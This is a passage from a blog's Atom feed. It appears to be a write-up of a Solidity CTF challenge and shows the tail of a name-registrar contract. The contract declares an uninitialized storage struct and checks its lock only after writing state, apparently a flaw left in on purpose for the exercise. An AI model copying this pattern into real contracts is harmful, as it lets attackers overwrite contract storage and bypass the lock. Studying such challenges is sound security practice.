registrar locked, no name updates</span></span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; <span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> NameRecord) public registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(<span class="function"><span class="params">bytes32</span> =&gt;</span> address) public resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">bytes32 _name, address _mappedAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。&lt;/p&gt;</summary>
    
    
    
    <category term="BlockChain" scheme="http://yoursite.com/categories/BlockChain/"/>
    
    
    <category term="区块链" scheme="http://yoursite.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="http://yoursite.com/tags/solidity/"/>
    
  </entry>
  
</feed>
